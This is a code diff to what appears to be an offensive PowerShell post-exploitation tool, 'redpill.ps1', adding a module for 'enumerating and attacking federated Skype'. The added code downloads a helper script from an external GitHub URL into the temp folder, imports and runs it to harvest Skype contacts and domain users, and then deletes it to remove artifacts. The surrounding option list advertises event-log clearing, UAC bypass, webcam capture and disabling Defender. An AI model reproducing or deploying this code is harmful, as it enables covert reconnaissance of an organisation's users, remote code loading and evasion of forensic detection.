@@ -102,6 +102,7 @@
    [string]$ToIPaddr="false",
    [string]$DnsSpoof="false",
    [string]$TimeOpen="false",
+   [string]$GetSkype="False",
    [string]$IconSet="False",
    [string]$Sponsor="false",
    [string]$UacMe="false",
@@ -163,6 +164,7 @@ $ListParameters = @"
   -GetTasks         Enum|Create|Delete       Enumerate\Create\Delete Remote Host Running Tasks
   -GetLogs          Enum|Verbose|Yara|Clear  Enumerate eventvwr logs OR Clear All event logs
   -GetBrowsers      Enum|Verbose|Creds       Enumerate Installed Browsers and Versions OR Verbose 
+  -GetSkype         Contacts|DomainUsers     Enumerating and attacking federated Skype
   -Screenshot       1                        Capture 1 Desktop Screenshot and Store it on %TMP%
   -Camera           Enum|Snap                Enum computer webcams OR capture default webcam snapshot 
   -StartWebServer   Python|Powershell        Downloads webserver to %TMP% and executes the WebServer.
@@ -2700,6 +2702,64 @@ If($UacMe -ne "false"){
 }
 
 
+If($GetSkype -ne "False"){
+
+   <#
+   .SYNOPSIS
+      PowerShell functions for enumerating and attacking federated Skype
+
+   .DESCRIPTION
+         PowerShell functions for enumerating and attacking federated Skype for Business instances.
+
+   .NOTES
+      Mandatory requirements: Microsoft.Lync.Model 2013 SDK
+
+   .Parameter GetSkype
+      Accepts arguments: Contacts, DomainUsers (default: Contacts)
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -GetSkype Contacts
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -GetSkype DomainUsers
+
+   .OUTPUTS
+      Email             Title              Full Name     Status    Out Of Office  Endpoints                                                                                   
+      -----             -----              ---------     ------    -------------  ---------                                                                                   
+      test@example.com  Person of Interest J Doe         Offline   False          Work: tel:911
+   #>
+
+
+   ## Download GetSkype.ps1 from my GitHub
+   If(-not(Test-Path -Path "$Env:TMP\GetSkype.ps1")){## Download GetSkype.ps1 from my GitHub repository
+      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/GetSkype.ps1 -Destination $Env:TMP\GetSkype.ps1 -ErrorAction SilentlyContinue|Out-Null
+      ## Check downloaded file integrity => FileSizeKBytes
+      $SizeDump = ((Get-Item -Path "$Env:TMP\GetSkype.ps1" -EA SilentlyContinue).length/1KB)
+      If($SizeDump -lt 22){## Corrupted download detected => DefaultFileSize: 22,322265625/KB
+         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
+         If(Test-Path -Path "$Env:TMP\GetSkype.ps1"){Remove-Item -Path "$Env:TMP\GetSkype.ps1" -Force}
+         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
+      }   
+   }
+
+
+   ## Import auxiliary module
+   Import-Module -Name "$Env:TMP\GetSkype.ps1" -EA SilentlyContinue -Force  ## <-- Import Module
+   If($GetSkype -ieq "Contacts") ## <-- Sellect the type of scan
+   {
+      Get-SkypeContacts | Format-Table -AutoSize ## <-- Run Module
+   }
+   ElseIf($GetSkype -ieq "DomainUsers")
+   {
+      Get-SkypeDomainUsers | Format-Table -AutoSize ## <-- Run Module
+   }
+
+   ## Clean Artifacts left behind
+   If(Test-Path -Path "$Env:TMP\GetSkype.ps1"){Remove-Item -Path "$Env:TMP\GetSkype.ps1" -Force}
+
+}
+
+
 ## --------------------------------------------------------------
 ##       HELP =>  * PARAMETERS DETAILED DESCRIPTION *
 ## --------------------------------------------------------------
@@ -4428,6 +4488,39 @@ $HelpParameters = @"
       UAC Settings  : Notify Me
       EOP Trigger   : C:\Users\pedro\AppData\Local\Temp\DavSyncProvider.dll
       RUN cmdline   : powershell -file C:\Users\pedro\AppData\Local\Temp\DisableDefender.ps1 -Action Stop
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "GetSkype"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Author: @kfosaaen | @r00t-3xp10it
+      Helper - Enumerating and attacking federated Skype
+
+   .DESCRIPTION
+      Enumerating and attacking Skype for Business instances.
+
+   .NOTES
+      Mandatory requirements: Microsoft.Lync.Model 2013 SDK
+      http://www.microsoft.com/en-us/download/details.aspx?id=36824
+      Remark: You need to have Skype open and signed in first!
+
+   .Parameter GetSkype
+      Accepts arguments: Contacts, DomainUsers (default: Contacts)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -GetSkype Contacts
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -GetSkype DomainUsers
+
+   .OUTPUTS
+      Email             Title              Full Name     Status    Out Of Office  Endpoints
+      -----             -----              ---------     ------    -------------  ---------
+      test@example.com  Person of Interest J Doe         Offline   False          Work: tel:911
    #>!bye..
 
 "@;
